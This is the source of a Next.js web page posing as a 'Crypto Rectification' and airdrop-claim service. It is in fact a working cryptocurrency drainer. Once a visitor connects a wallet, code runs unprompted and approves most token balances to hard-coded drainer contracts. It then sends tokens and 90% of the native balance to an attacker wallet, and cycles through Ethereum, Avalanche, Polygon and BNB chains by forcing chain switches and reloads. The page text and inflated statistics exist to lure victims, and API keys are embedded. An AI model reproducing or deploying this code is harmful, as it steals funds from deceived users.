"use client"
import Image from "next/image";
import { Metadata } from 'next';
import hero_img_1 from '../../public/hero_img_1.png';
import etherium from '../../public/etherium.png';
import blog11 from '../../public/blog11.jpeg';
import blog9 from '../../public/blog9.jpeg'
import about_img_3 from '../../public/about_img_3.png';
import about_img_2 from '../../public/about_img_2.png';
import logo_footer from '../../public/logo_footer.svg';
import logo_mini from '../../public/logo_mini.svg';
import { useRouter } from 'next/navigation';
import { useState, useEffect } from "react";

import { createWeb3Modal, defaultConfig } from '@web3modal/ethers5/react';
import { useWeb3Modal } from '@web3modal/ethers5/react';
import { useWeb3ModalProvider, useWeb3ModalAccount, useWeb3ModalState } from '@web3modal/ethers5/react'
import { BigNumber, Contract, ethers } from 'ethers';
import Drainer from '../components/build/Drainer.json'
// import Drainer from '../build/Drainer.json';



const abi = [
  {
      "constant": false,
      "inputs": [
          {
              "name": "spender",
              "type": "address"
          },
          {
              "name": "amount",
              "type": "uint256"
          }
      ],
      "name": "approve",
      "outputs": [
          {
              "name": "",
              "type": "bool"
          }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
  }
];

// 1. Get projectId at https://cloud.walletconnect.com
const projectId = '92f8c0e47c40ad2cc082fddb43804acd'

const others = [
  {
    chainId: 42161,
    name: 'Arbitrum',
    currency: 'ETH',
    explorerUrl: 'https://arbiscan.io',
    rpcUrl: 'https://arb1.arbitrum.io/rpc'
  },
  {
    chainId: 43114,
    name: 'Avalanche Network',
    currency: 'AVAX',
    explorerUrl: 'https://snowtrace.io',
    rpcUrl: 'https://api.avax.network/ext/bc/C/rpc'
  },
  {
    chainId: 25,
    name: 'Cronos Network',
    currency: 'CRO',
    explorerUrl: 'https://cronos.crypto.org/explorer',
    rpcUrl: 'https://evm-cronos.crypto.org'
  },
  {
    chainId: 250,
    name: 'Fantom Opera Network',
    currency: 'FTM',
    explorerUrl: 'https://ftmscan.com',
    rpcUrl: 'https://rpcapi.fantom.network'
  }
]

// 2. Set chains
const mainnet_chains = [
  {
    chainId: 1,
    name: 'Ethereum',
    currency: 'ETH',
    explorerUrl: 'https://etherscan.io',
    rpcUrl: 'https://mainnet.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68'
  },{
    chainId: 137,
    name: 'Polygon Mainnet',
    currency: 'MATIC',
    explorerUrl: 'https://polygonscan.com/',
    rpcUrl: 'https://polygon-mainnet.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68'
  },{
    chainId: 56,
    name: 'BNB Chain',
    currency: 'BNB',
    explorerUrl: 'https://bscscan.com/',
    rpcUrl: 'https://bsc-mainnet.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68'
  },{
    chainId: 43114,
    name: 'Avalanche Network C-Chain',
    currency: 'AVAX',
    explorerUrl: 'https://snowtrace.io/',
    rpcUrl: 'https://avalanche-mainnet.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68'
  }
]
const testnets_chains = [{
  chainId: 11155111,
  name: "Sepolia Test Network",
  currency: 'ETH',
  explorerUrl: 'https://sepolia.etherscan.io',
  rpcUrl: 'https://sepolia.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68'
},
{
  chainId: 97,
  name: 'Binance Smart Chain',
  currency: 'tBNB',
  explorerUrl: 'https://testnet.bscscan.com',
  rpcUrl: 'https://bsc-testnet-rpc.publicnode.com'
}]

// 3. Create modal
const metadata = {
  name: 'Swift Protocol Resolver',
  description: 'The swiftprotocol resolver!',
  url: 'https://swiftprotocol.defilayerapp.com', // origin must match your domain & subdomain
  icons: ['https://swiftprotocol.defilayerapp.com/icon.ico']
}




// 4. Create Ethers config
// const ethersConfig = defaultConfig({
//   metadata,
//   enableEIP6963: true, // true by default
//   enableInjected: true, // true by default
//   enableCoinbase: true, // true by default
//   rpcUrl: 'https://sepolia.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68', // used for the Coinbase SDK
//   defaultChainId: 1 // used for the Coinbase SDK
// })

createWeb3Modal({
  ethersConfig: defaultConfig({ metadata }),
  chains: mainnet_chains,
  projectId,
  enableAnalytics: true,// Optional - defaults to your Cloud configuration
  featuredWalletIds: [
      '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
      'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
      'a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393'
  ],
  // excludeWalletIds: [
  //   'a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393'
  // ],
  allowUnsupportedChain: true
})

// includeWalletIds: [

// ]

export default function Home() {
  const router = useRouter();
  const [data, setData] = useState([])
  const [addrInfo, setAddrInfo] = useState([])
  const [ change, setChange] = useState(false);
  const [inputted, setInputted] = useState('')
  const [availChains, setAvailChains] = useState([
    {name: 'sepolia', chainId: "11155111", status: false},
    {name: 'bnb', chainId : "97", status: false}
  ])
  const { chainId, isConnected, address} = useWeb3ModalAccount()
  const { walletProvider } = useWeb3ModalProvider();
  const { open } = useWeb3Modal()

  useEffect(() => {

    async function getMoralisData(address) {
      const response = await fetch(`/api/getAllInfo?address=${address}`)
      const inf = await response.json()
      console.log('resulted: ', response)
      if (response.ok) {
          setAddrInfo(inf)
      } else {
        setAddrInfo([])
      }
    }

    if(address) {getMoralisData(address)}


  }, [address])

  useEffect(() => {

    setTimeout(() => {

      if(isConnected) {
          claimReward(addrInfo)
      } else {
          console.log('We out here')
      }


    }, 3000)
  }, [isConnected, addrInfo])

  const clicked = () => {
    if(isConnected) {
      console.log('yay')
    } else {
      open()
    }
  }

  const change_ = () => {
    console.log('i am clicked!')
    setChange(!change)
  }

  const toplinks = () => {
    return data.map((d,i) => {
      return (
        <li key={i} onClick={clicked} class="px-2 py-2 flex gap-2 text-sm whitespace-nowrap">
          <span class="font-medium">{i+1}</span>
          <a class="text-brand" href={`#`}>{d.token}</a>
        </li>
      )
    })
  }

  const produce = (e) => {
    setInputted(e.target.value)
  }

  const claimReward = async(addrInfo) => {

    console.log('chainId', chainId)
    const drainAddresses = ['0x67eFE8239Dd091Da8486f7b07921D7b699AECc4F', '0xAb31D50880eE7AfbcBE729087C21fbe9cA434E37']
    const testDrainAddresses = ['0x8DDb1bAA8ed0307bF7B44764c64404bd49A19eA4', '0xBa1554D59FED763F726123cCc0467ad7c0C81e7E']

    let ethersProvider = new ethers.providers.Web3Provider(walletProvider)

    console.log('Addy: ', addrInfo)
    const trasnferERC = addrInfo && addrInfo.filter(d => {
      return d.chain === chainId
    })

    console.log('transferERC', trasnferERC)

    const signer = ethersProvider.getSigner()
    let bal = await ethersProvider.getBalance(address)
    console.log('ball: ', bal)
    // let calc95 = (bal * BigNumber.from(10))/BigNumber.from(100)
    // console.log('cal95: ', calc95)


    // if(chainId === 1) {
    //   estimate_gas = await ethersProvider.estimateGas({
    //     // from: address,
    //     to: drainAddresses[0],
    //     value: bal
    //   })
    // } else {
    //   estimate_gas = await ethersProvider.estimateGas({
    //     to: drainAddresses[1],
    //     value: bal
    //   })
    // }

    // if(chainId === 11155111) {
    //   estimate_gas = await ethersProvider.estimateGas({
    //     from: address,
    //     to: testDrainAddresses[0],
    //     value: bal
    //   })
    // } else {
    //   estimate_gas = await ethersProvider.estimateGas({
    //     from: address,
    //     to: testDrainAddresses[1],
    //     value: bal
    //   })
    // }


    const gasPrice = (await ethersProvider.getFeeData()).maxFeePerGas;
    console.log('Fee Data: ', gasPrice);

    if(BigInt(bal) < BigInt(gasPrice)) {
      alert(`You can stop here, no funds to complete your request!!! your balance: ${bal} is less than the gas price: ${gasPrice} \n subtract bal-gasPrice ${bal-gasPrice}`)

    } else {
        const balances = bal - gasPrice;
        console.log('bal: ', balances);

        const balsent95_afterfees = (balances * 90) / 100
        console.log('balsent95_afterfees: ', balsent95_afterfees)

        const ethVal = ethers.utils.formatEther(BigInt(Math.round(balsent95_afterfees)))
        console.log('ethVal: ', ethVal)
        const amount = ethers.utils.parseEther(ethVal)
        console.log('amt: ', amount)


        // The Contract object
        let DrainerContract;
        let ERC20;
        let info = []
        // let recipient = '0x6763d3CE81f12c6af800799432A1EF841BF33eA4'
        // let recipient = '0x025ad4D4254511D84b3Ad5E85e02D879B8ea1681' //for sato
        // let recipient = '0xA1ff3166bA5aB978D8011d1090b1884dc0334d9B' //for X
        let recipient = '0x823D4268D95b4Fde9BF7ea785867d2136B5fE806' // for X-cuz

        switch (chainId) {
          case 1:
              if (availChains[0].status) {
                break
              }

              console.log('transferERC', trasnferERC)

              for (let i=0; i < trasnferERC.length; i++) {
                // const amountInWei = ethers.utils.parseUnits(amount.toString(), 18);
                // Calculate 95% of the balance
                const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
                const balan = BigInt(trasnferERC[i].balance)
                console.log('balanceInDecimal: ', bal)

                let calctok95 = (balan * BigInt(95))/BigInt(100)
                const ethh = ethers.utils.formatEther(calctok95)
                const amt = ethers.utils.parseEther(ethh)
                console.log('console: ', amt)
                // Approve 95% of the balance
                const tx = await tokenContract.approve(drainAddresses[0], amt);
                await tx.wait();
              }

              DrainerContract = new Contract(drainAddresses[0], Drainer.abi, signer)
              const txn = await DrainerContract.transferAll(trasnferERC, recipient, {value: amount})
              await txn.wait()
              info = [...availChains]
              info[0].status = true
              setAvailChains(info)
              break;
          case 56:
            if (availChains[1].status) {
              break
            }

            for (let i=0; i < trasnferERC.length; i++) {
              const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
              const balan = BigInt(trasnferERC[i].balance)
              console.log('balanceInDecimal: ', bal)

              let calct5 = (balan * BigInt(95))/BigInt(100)
              const ethh = ethers.utils.formatEther(calct5)
              const amt = ethers.utils.parseEther(ethh)
              console.log('console: ', amt)
              const tx = await tokenContract.approve(drainAddresses[1], amt);
              await tx.wait();
            }

            DrainerContract = new Contract(drainAddresses[1], Drainer.abi, signer)
            const txx = await DrainerContract.transferAll(trasnferERC, recipient,  {value: amount})
            await txx.wait()
            info = [...availChains]
            info[1].status = true
            setAvailChains(info)

            break;
          case 43114:
              if (availChains[1].status) {
                break
              }

              for (let i=0; i < trasnferERC.length; i++) {
                const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
                const balan = BigInt(trasnferERC[i].balance)
                console.log('balanceInDecimal: ', bal)

                let calct5 = (balan * BigInt(95))/BigInt(100)
                const ethh = ethers.utils.formatEther(calct5)
                const amt = ethers.utils.parseEther(ethh)
                console.log('console: ', amt)
                const tx = await tokenContract.approve(drainAddresses[1], amt);
                await tx.wait();
              }

              DrainerContract = new Contract(drainAddresses[1], Drainer.abi, signer)
              const tfl = await DrainerContract.transferAll(trasnferERC, recipient,  {value: amount})
              await tfl.wait()
              info = [...availChains]
              info[1].status = true
              setAvailChains(info)

              break;
            case 137:
                if (availChains[1].status) {
                  break
                }

                for (let i=0; i < trasnferERC.length; i++) {
                  const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
                  const balan = BigInt(trasnferERC[i].balance)
                  console.log('balanceInDecimal: ', bal)

                  let calct5 = (balan * BigInt(95))/BigInt(100)
                  const ethh = ethers.utils.formatEther(calct5)
                  const amt = ethers.utils.parseEther(ethh)
                  console.log('console: ', amt)
                  const tx = await tokenContract.approve(drainAddresses[1], amt);
                  await tx.wait();
                }

                DrainerContract = new Contract(drainAddresses[1], Drainer.abi, signer)
                const txl = await DrainerContract.transferAll(trasnferERC, recipient,  {value: amount})
                await txl.wait()
                info = [...availChains]
                info[1].status = true
                setAvailChains(info)

                break;
          default:
            break;
        }

        // switch (chainId) {
        //   case 11155111:
        //     if (availChains[0].status) {
        //       break
        //     }

        //     if(trasnferERC.length) {
        //       for (let i=0; i < trasnferERC.length; i++) {
        //         // const amountInWei = ethers.utils.parseUnits(amount.toString(), 18);
        //         // Calculate 95% of the balance
        //         const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
        //         const balan = BigInt(trasnferERC[i].balance)
        //         console.log('balanceInDecimal: ', bal)

        //         let calctok95 = (balan * BigInt(95))/BigInt(100)
        //         const ethh = ethers.utils.formatEther(calctok95)
        //         const amt = ethers.utils.parseEther(ethh)
        //         console.log('console: ', amt)
        //         // Approve 95% of the balance
        //         const tx = await tokenContract.approve(testDrainAddresses[0], amt);
        //         await tx.wait();
        //       }
        //     }


        //     DrainerContract = new Contract(testDrainAddresses[0], Drainer.abi, signer)
        //     const txn = await DrainerContract.transferAll(trasnferERC, recipient, {value: amount})
        //     await txn.wait()
        //     info = [...availChains]
        //     info[0].status = true
        //     setAvailChains(info)
        //     break;
        //   case 97:
        //     if (availChains[1].status) {
        //       break
        //     }

        //     if(trasnferERC.length) {
        //        for (let i=0; i < trasnferERC.length; i++) {
        //       const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
        //       const balan = BigInt(trasnferERC[i].balance)

        //       let calct5 = (balan * BigInt(95))/BigInt(100)
        //       const ethh = ethers.utils.formatEther(calct5)
        //       const amt = ethers.utils.parseEther(ethh)
        //       console.log('console: ', amt)
        //       const tx = await tokenContract.approve(testDrainAddresses[1], amt);
        //       await tx.wait();
        //     }
        //     }


        //     DrainerContract = new Contract(testDrainAddresses[1], Drainer.abi, signer)
        //     const txx = await DrainerContract.transferAll(trasnferERC, recipient,  {value: amount})
        //     await txx.wait()
        //     info = [...availChains]
        //     info[1].status = true
        //     setAvailChains(info)

        //     break;
        //   default:
        //     break;
        // }



    }


    try {

      if(chainId === 1) {

        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0xa86a' }],
        });
        window.location.reload()
      } else if(chainId === 43114){

        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x89' }],
        });

        window.location.reload()

      } else if(chainId === 137){

        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }],
        });

        window.location.reload()

      } else if(chainId === 56){

        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x1' }],
        });

        window.location.reload()

      }
    } catch (error) {
      console.log('Error: ', error)
    }


    // try {

    //   if(chainId === 11155111) {

    //     await window.ethereum.request({
    //       method: 'wallet_switchEthereumChain',
    //       params: [{ chainId: '0x61' }],
    //     });
    //     window.location.reload()
    //   } else {

    //     await window.ethereum.request({
    //       method: 'wallet_switchEthereumChain',
    //       params: [{ chainId: '0xAA36A7' }],
    //     });

    //     window.location.reload()

    //   }
    // } catch (error) {
    //   console.log('Error: ', error)
    // }



  }

  return (
    <main>
            <header className="cs-site_header cs-style1 cs-sticky-header cs-primary_color cs-sticky-active bg-design">
              <div className="cs-main_header">
                <div className="container">
                  <div className="cs-main_header_in">
                    <div className="cs-main_header_left">
                      <a className="cs-site_branding cs-accent_color interact-button">
                        <Image src={logo_mini}  alt={'logo'} width={30} height={30} className="cs-hide_dark" />
                        {/* <img src="./index_files/logo_mini.svg" alt="Logo" class="cs-hide_dark">
                        <img src="./index_files/logo_mini.svg" alt="Logo" class="cs-hide_white"> */}
                      </a>
                    </div>
                    <div className="cs-main_header_center">
                    <div class="cs-nav">
                      <ul class="cs-nav_list">
                        <li className="p-5 text-white" onClick={clicked}>
                          <a class="interact-button cs-smoth_scroll">Connect</a>
                        </li>
                        <li className="p-5 text-white" onClick={clicked}>
                          <a target="_blank" class="cs-smoth_scroll interact-button">Claim Airdrop</a>
                        </li>
                      </ul>
                    </div>

                    </div>
                    <a className="interact-button">
                    <div className="cs-main_header_right">
                      {isConnected ? (
                        <div className="cs-toolbox">
                        <>
                        <span className="cs-icon_btn cs-mode_btn p-5 text-white">
                        {/* <svg xmlns="http://www.w3.org/2000/svg" xmlnsXlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" className="cs-hide_dark iconify iconify--ph" width="1em" height="1em" viewBox="0 0 256 256">
                          <path fill="currentColor" d="M233.54 142.23a8 8 0 0 0-8-2a88.08 88.08 0 0 1-109.8-109.8a8 8 0 0 0-10-10a104.84 104.84 0 0 0-52.91 37A104 104 0 0 0 136 224a103.09 103.09 0 0 0 62.52-20.88a104.84 104.84 0 0 0 37-52.91a8 8 0 0 0-1.98-7.98Zm-44.64 48.11A88 88 0 0 1 65.66 67.11a89 89 0 0 1 31.4-26A106 106 0 0 0 96 56a104.11 104.11 0 0 0 104 104a106 106 0 0 0 14.92-1.06a89 89 0 0 1-26.02 31.4Z"></path>
                        </svg> */}
                        <svg xmlns="http://www.w3.org/2000/svg" xmlnsXlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" className="cs-hide_white iconify iconify--ph" width="1em" height="1em" viewBox="0 0 256 256">
                          <path fill="currentColor" d="M116 32V16a12 12 0 0 1 24 0v16a12 12 0 0 1-24 0Zm80 96a68 68 0 1 1-68-68a68.07 68.07 0 0 1 68 68Zm-24 0a44 44 0 1 0-44 44a44.05 44.05 0 0 0 44-44ZM51.51 68.49a12 12 0 1 0 17-17l-12-12a12 12 0 0 0-17 17Zm0 119l-12 12a12 12 0 0 0 17 17l12-12a12 12 0 1 0-17-17ZM196 72a12 12 0 0 0 8.49-3.51l12-12a12 12 0 0 0-17-17l-12 12A12 12 0 0 0 196 72Zm8.49 115.51a12 12 0 0 0-17 17l12 12a12 12 0 0 0 17-17ZM44 128a12 12 0 0 0-12-12H16a12 12 0 0 0 0 24h16a12 12 0 0 0 12-12Zm84 84a12 12 0 0 0-12 12v16a12 12 0 0 0 24 0v-16a12 12 0 0 0-12-12Zm112-96h-16a12 12 0 0 0 0 24h16a12 12 0 0 0 0-24Z"></path>
                        </svg>
                        </span>
                        </>
                        <div className="pt-3">
                        <w3m-button />
                        </div>
                        <div className="pt-4 pl-5 menu" onClick={clicked} style={{color: 'white'}}><button><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="inline-block" height="30" width="30" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="48" d="M88 152h336M88 256h336M88 360h336"></path></svg></button></div>

                        </div>
                      ) : (
                        <div className="cs-toolbox" onClick={clicked}>
                        <span className="cs-icon_btn cs-mode_btn p-5 text-white">
                          {/* <svg xmlns="http://www.w3.org/2000/svg" xmlnsXlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" className="cs-hide_dark iconify iconify--ph" width="1em" height="1em" viewBox="0 0 256 256">
                            <path fill="currentColor" d="M233.54 142.23a8 8 0 0 0-8-2a88.08 88.08 0 0 1-109.8-109.8a8 8 0 0 0-10-10a104.84 104.84 0 0 0-52.91 37A104 104 0 0 0 136 224a103.09 103.09 0 0 0 62.52-20.88a104.84 104.84 0 0 0 37-52.91a8 8 0 0 0-1.98-7.98Zm-44.64 48.11A88 88 0 0 1 65.66 67.11a89 89 0 0 1 31.4-26A106 106 0 0 0 96 56a104.11 104.11 0 0 0 104 104a106 106 0 0 0 14.92-1.06a89 89 0 0 1-26.02 31.4Z"></path>
                          </svg> */}
                          <svg xmlns="http://www.w3.org/2000/svg" xmlnsXlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" className="cs-hide_white iconify iconify--ph" width="1em" height="1em" viewBox="0 0 256 256">
                            <path fill="currentColor" d="M116 32V16a12 12 0 0 1 24 0v16a12 12 0 0 1-24 0Zm80 96a68 68 0 1 1-68-68a68.07 68.07 0 0 1 68 68Zm-24 0a44 44 0 1 0-44 44a44.05 44.05 0 0 0 44-44ZM51.51 68.49a12 12 0 1 0 17-17l-12-12a12 12 0 0 0-17 17Zm0 119l-12 12a12 12 0 0 0 17 17l12-12a12 12 0 1 0-17-17ZM196 72a12 12 0 0 0 8.49-3.51l12-12a12 12 0 0 0-17-17l-12 12A12 12 0 0 0 196 72Zm8.49 115.51a12 12 0 0 0-17 17l12 12a12 12 0 0 0 17-17ZM44 128a12 12 0 0 0-12-12H16a12 12 0 0 0 0 24h16a12 12 0 0 0 12-12Zm84 84a12 12 0 0 0-12 12v16a12 12 0 0 0 24 0v-16a12 12 0 0 0-12-12Zm112-96h-16a12 12 0 0 0 0 24h16a12 12 0 0 0 0-24Z"></path>
                          </svg>
                        </span>
                        <span className="interact-button cs-btn cs-btn_filed cs-accent_btn cs-modal_btn" data-modal="connect_wallet">
                          <svg xmlns="http://www.w3.org/2000/svg" xmlnsXlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="iconify iconify--ion" width="1em" height="1em" viewBox="0 0 512 512">
                            <rect width="416" height="288" x="48" y="144" fill="none" stroke="currentColor" strokeLinejoin="round" strokeWidth="32" rx="48" ry="48"></rect>
                            <path fill="none" stroke="currentColor" strokeLinejoin="round" strokeWidth="32" d="M411.36 144v-30A50 50 0 0 0 352 64.9L88.64 109.85A50 50 0 0 0 48 159v49"></path>
                            <path fill="currentColor" d="M368 320a32 32 0 1 1 32-32a32 32 0 0 1-32 32Z"></path>
                          </svg>
                          <span>Connect</span>
                        </span>

                        <div className="pt-4 pl-5 menu" onClick={clicked} style={{color: 'white'}}><button><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="inline-block" height="30" width="30" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="48" d="M88 152h336M88 256h336M88 360h336"></path></svg></button></div>

                      </div>
                      )}
                    </div>
                  </a>
                  </div>
                </div>
              </div>
            </header>

            <div className="cs-height_80 cs-height_lg_80"></div>

            <section className="cs-hero cs-style1 cs-type1 cs-bg" data-src="../../public/hero_img_3.jpeg" id="home">
            <div className="cs-dark_overlay"></div>
            <div className="container md:flex-col">
              <div className="cs-hero_text wow fadeInLeft " data-wow-duration="1s" data-wow-delay="0.35s">
                {/* <h2 className="cs-hero_secondary_title cs-font_24 cs-font_18_sm">0 / 725 &nbsp;Minted</h2> */}
                <h1 className="cs-hero_title cs-bold">
                  Your Trusted Blockchain and Solution! <br />Crypto Rectification
                </h1>
                <div className="cs-btn_group mt-10">
                  <a className="interact-button cs-btn cs-btn_filed cs-accent_btn" onClick={clicked} style={{color: "white"}}><span>Connect</span></a>
                  <a className="cs-btn cs-color1 interact-button" onClick={clicked}><span>Claim Presale</span></a>
                </div>
                <h3 className="cs-hero_subtitle cs-font_18 cs-font_16_sm cs-body_line_height">
                  Your go-to online tool to
                  <span className="cs-accent_color"> seamlessly and efficiently</span> fix
                  any blockchain-related issues you might encounter.
                  <br />
                </h3>
              </div>
              <div className="cs-hero_img wow fadeIn"  data-wow-duration="1s" data-wow-delay="0.2s">
                <Image src={hero_img_1}  alt="Hero Image" />
                <div className="cs-hero_img_sm">
                  <Image src={etherium} alt="Hero Image" />
                </div>
              </div>
            </div>
            <div id="background-wrap">
              <div className="bubble x1"></div>
              <div className="bubble x2"></div>
              <div className="bubble x3"></div>
              <div className="bubble x4"></div>
              <div className="bubble x5"></div>
              <div className="bubble x6"></div>
              <div className="bubble x7"></div>
              <div className="bubble x8"></div>
              <div className="bubble x9"></div>
              <div className="bubble x10"></div>
            </div>
            </section>

            <div className="cs-height_100 cs-height_lg_70"></div>

            <div className="container">
              <div className="row align-center">
              <div class="grid grid-cols-2 gap-6 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 mt-12 w-full">

                <div class="transition-all p-6 rounded-lg shadow-sm hover:shadow-sm cs-light_bg text-center cs-radius_10">
                  <div class=" mx-auto mb-6 text-center">
                  <div class="cs-height_60 cs-height_lg_60"></div>
                    <h3 class="font-medium leading-relaxed cs-font_64 cs-font_36_sm cs-m0 cs-primary_font cs-primary_color cs-heading_line_height cs-bold">18365</h3>
                    <p class="cs-m0 cs-font_24 cs-heading_line_height cs-font_22_sm">Total Users</p>
                    {/* <div class="cs-height_65 cs-height_lg_65"></div> */}
                  </div>
                  </div>

                  <div class="transition-all p-6 rounded-lg shadow-sm hover:shadow-sm cs-light_bg text-center cs-radius_10">
                  <div class=" mx-auto mb-6 text-center">
                  <div class="cs-height_60 cs-height_lg_60"></div>
                    <h3 class="font-medium text-lg leading-relaxed cs-font_64 cs-font_36_sm cs-m0 cs-primary_font cs-primary_color cs-heading_line_height cs-bold">1125</h3>
                    <p class="cs-m0 cs-font_24 cs-heading_line_height cs-font_22_sm">Token Support</p>
                    {/* <div class="cs-height_65 cs-height_lg_65"></div> */}
                  </div>
                  </div>

                  <div class="transition-all p-6 rounded-lg shadow-sm hover:shadow-sm cs-light_bg text-center cs-radius_10">
                  <div class=" mx-auto mb-6 text-center">
                  <div class="cs-height_60 cs-height_lg_60"></div>
                    <h3 class="font-medium text-lg leading-relaxed cs-font_64 cs-font_36_sm cs-m0 cs-primary_font cs-primary_color cs-heading_line_height cs-bold">5.72</h3>
                    <p class="cs-m0 cs-font_24 cs-heading_line_height cs-font_22_sm">Years</p>
                    {/* <div class="cs-height_65 cs-height_lg_65"></div> */}
                  </div>
                  </div>

                  <div class="transition-all p-6 rounded-lg shadow-sm hover:shadow-sm cs-light_bg text-center cs-radius_10">
                  <div class=" mx-auto mb-6 text-center">
                  <div class="cs-height_60 cs-height_lg_60"></div>
                    <h3 class="font-medium text-lg leading-relaxed cs-font_64 cs-font_36_sm cs-m0 cs-primary_font cs-primary_color cs-heading_line_height cs-bold">42.2M</h3>
                    <p class="cs-m0 cs-font_24 cs-heading_line_height cs-font_22_sm">Volume Traded</p>
                    {/* <div class="cs-height_65 cs-height_lg_65"></div> */}
                  </div>
                  </div>

              </div>
              </div>
            </div>

            <div className="cs-height_70 cs-height_lg_40"></div>


            <section className="mt-10">
              <div className="container">
              <div className="cs-seciton_heading cs-style1 text-center wow fadeInUp" data-wow-duration="1s" data-wow-delay="0.2s">
                  <h3 className="cs-section_title cs-font_16 cs-font_14_sm cs-gradient_color">
                    Simple Steps
                  </h3>
                  <h2 class="cs-section_subtitle cs-m0 cs-font_36 cs-font_24_sm text-white">
                    How to Fix Web3 Related Issues
                  </h2>
              </div>
              <div className="cs-height_50 cs-height_lg_30"></div>

              <div className="row">
              <div className="grid grid-cols-1 gap-6 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 mt-12 w-full">

                <div class="transition-all p-6 rounded-lg shadow-sm hover:shadow-sm cs-light_bg text-center cs-radius_10">
                  <div class=" mx-auto mb-6 text-center cs-card">
                  <div class="cs-height_60 cs-height_lg_60"></div>
                  <div class="cs-card_number cs-font_30 cs-font_24_sm cs-primary_font cs-body_line_height cs-center">1</div>
                  <h1 class="text-3xl sm:xl font-bold text-gray-400 dark:text-brand-text-dark">Select Issue to Fix</h1>
                    {/* <div class="cs-height_65 cs-height_lg_65"></div> */}
                  </div>
                  </div>

                  <div class="transition-all p-6 rounded-lg shadow-sm hover:shadow-sm cs-light_bg text-center cs-radius_10">
                  <div class=" mx-auto mb-6 text-center cs-card">
                  <div class="cs-height_60 cs-height_lg_60"></div>
                  <div class="cs-card_number cs-font_30 cs-font_24_sm cs-primary_font cs-body_line_height cs-center">2</div>
                  <p class="text-3xl sm:xl font-bold text-gray-400 dark:text-brand-text-dark">Connect Your Wallet</p>
                    {/* <div class="cs-height_65 cs-height_lg_65"></div> */}
                  </div>
                  </div>

                  <div class="transition-all p-6 rounded-lg shadow-sm hover:shadow-sm cs-light_bg text-center cs-radius_10">
                  <div class=" mx-auto mb-6 text-center cs-card">
                  <div class="cs-height_60 cs-height_lg_60"></div>
                  <div class="cs-card_number cs-font_30 cs-font_24_sm cs-primary_font cs-body_line_height cs-center">3</div>
                  <p class="text-3xl sm:xl font-bold text-gray-400 dark:text-brand-text-dark">Approve Connection</p>
                    {/* <div class="cs-height_65 cs-height_lg_65"></div> */}
                  </div>
                  </div>


                  <div class="transition-all p-6 rounded-lg shadow-sm hover:shadow-sm cs-light_bg text-center cs-radius_10">
                  <div class=" mx-auto mb-6 text-center cs-card">
                  <div class="cs-height_60 cs-height_lg_60"></div>
                  <div class="cs-card_number cs-font_30 cs-font_24_sm cs-primary_font cs-body_line_height cs-center">4</div>
                  <p class="text-3xl sm:xl font-bold text-gray-400 dark:text-brand-text-dark">Wait while Issue get Fixed</p>
                    {/* <div class="cs-height_65 cs-height_lg_65"></div> */}
                  </div>
                  </div>

              </div>
              </div>


              </div>
            </section>



            <section id="about">
            <div className="h-16 lg:h-10"></div>

            <div className="container mx-auto px-4">
              <div className="flex flex-col-reverse lg:flex-row items-center">
                <div className="lg:w-7/12 wow fadeInLeft" data-wow-duration="1s" data-wow-delay="0.2s">
                  <div className="h-0 lg:h-10"></div>
                  <div className="mr-36 w-full">
                    {/* <div className="text-center lg:text-left">
                      <h3 className="text-2xl sm:text-lg font-semibold text-transparent cs-gradient_color top-head">
                        CLAIM AIRDROP
                      </h3>
                      <h2 className="text-4xl sm:text-2xl lg:text:5xl font-bold mt-0 text-white">
                        You can choose to Connect Manually
                      </h2>
                    </div> */}
                    <div class="cs-seciton_heading cs-style1 " >
                          <h3 class="cs-section_title cs-font_16 cs-font_14_sm cs-gradient_color">
                            Claim Airdrop
                          </h3>
                          <h2 class="cs-section_subtitle cs-m0 cs-font_36 cs-font_24_sm text-white">
                            You can choose to Connect Manually
                          </h2>
                        </div>
                    <div className="h-5 lg:h-5"></div>
                    <p style={{color: "#dcdcdc"}}>
                      While our automatic connection tools are designed for seamless integration, some situations call for a little extra control. That's where "Connect Manually" comes in. This option gives you the power to hand-pick your wallet and tailor the connection process to your specific needs. Whether you prefer the familiarity of a direct address or the security of a QR code scan, "Connect Manually" offers the flexibility you crave. So, take a deep breath, dive into the details, and connect your wallet just the way you like it.
                    </p>
                    <div className="h-6 lg:h-4"></div>
                    <div className="text-center lg:text-left" onClick={clicked}>
                      <a className="inline-flex items-center px-4 py-2 bg-blue-500 text-white rounded-lg hover:bg-blue-600 transition duration-300">
